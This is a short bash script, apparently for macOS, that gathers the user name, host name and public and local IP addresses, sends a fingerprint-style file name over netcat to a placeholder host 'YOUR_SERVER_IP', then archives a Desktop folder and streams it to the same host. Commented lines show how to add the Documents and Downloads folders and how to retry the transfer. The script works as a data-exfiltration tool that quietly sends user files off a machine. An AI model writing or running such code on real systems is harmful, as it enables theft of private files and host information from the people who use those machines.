#!/bin/bash

# set -e # quit if exception

MAX_RETRIES=5
COUNT=0

USER_NAME=$(whoami)
HOST_NAME=$(hostname)

DATE=$(date +"%Y-%m-%d_%H-%M-%S")

PUBLIC_IP=$(curl -s https://api.ipify.org)

LOCAL_IP=$(ipconfig getifaddr en0)

FILE_NAME="${USER_NAME}_${HOST_NAME}_${PUBLIC_IP}_${LOCAL_IP}_${DATE}.tar.gz"

echo "$FILE_NAME" | nc YOUR_SERVER_IP 9001

sleep 1                      

PATHS=(
"$HOME/Desktop/myapp"
#"$HOME/Documents/projects"
#"$HOME/Downloads/test.txt"
)

tar -czf - "${PATHS[@]}" | nc YOUR_SERVER_IP 9000


# until tar -czf - ~/Desktop/myapp | nc SERVER_IP 9000
# do
#     sleep 5
# done